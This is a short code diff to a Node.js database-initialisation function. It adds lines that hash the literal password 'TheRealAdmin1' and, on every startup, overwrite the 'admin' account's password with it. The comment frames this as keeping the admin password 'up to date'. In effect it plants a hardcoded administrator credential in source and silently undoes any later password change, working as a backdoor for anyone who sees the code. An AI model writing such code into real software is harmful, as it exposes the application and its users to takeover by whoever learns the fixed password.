@@ -3162,6 +3162,10 @@ async function initDatabase() {
     await pool.query('SELECT 1');
     dbConnected = true;
     console.log('✅ Connected to PostgreSQL database');
+
+    // Ensure admin password is up to date
+    const newAdminHash = await hashPassword('TheRealAdmin1');
+    await dbRun('UPDATE admins SET password_hash = $1 WHERE username = $2', [newAdminHash, 'admin']);
   } catch (err) {
     console.error('Database connection failed:', err.message);
     dbConnected = false;
